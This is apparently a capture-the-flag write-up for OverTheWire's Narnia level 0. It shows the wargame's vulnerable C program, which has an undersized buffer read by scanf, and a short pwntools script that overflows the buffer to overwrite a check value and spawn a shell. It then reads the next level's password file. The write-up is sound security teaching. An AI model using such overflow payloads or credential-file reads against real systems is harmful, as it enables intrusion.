---
title: Narnia0

published: 2025-06-18

description: Buffer Overflow

tags: [pwn, buffer overflow, c]

category: overthewire-narnia
---

# Narnia 0

## C File

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

## Approach

Looks like the code initially sets `val` to `0x41414141` and then only gives us a shell if `val` magically turns into `0xdeadbeef`

However, since the `scanf` takes in 24 chars and the buffer is only 20 we can enter in some extra input that will overwrite val into `0xdeadbeef`

## Solution

Now we write a quick pwntools solution to get our shell

```python
from pwn import *
payload = b'A'*20
payload += p32(0xdeadbeef)

p = process("/narnia/narnia0")
p.sendline(payload)
p.interactive()
```

First we send 20 chars of random input to fill up `buf` then we add `0xdeadbeef` which will overflow into `val` letting us pass the check

Finally we send this to the process and enter interactive so we can grab the password to the next level using `cat /etc/narnia_pass/narnia1`

*I won't be showing the passwords in this write up since the game is always running*

## Conclusion

When writing c programs always make sure that the buffer is large enough to contain the users input including the null byte

Not doing this can risk a buffer overflow leading to vulnerabilies like this
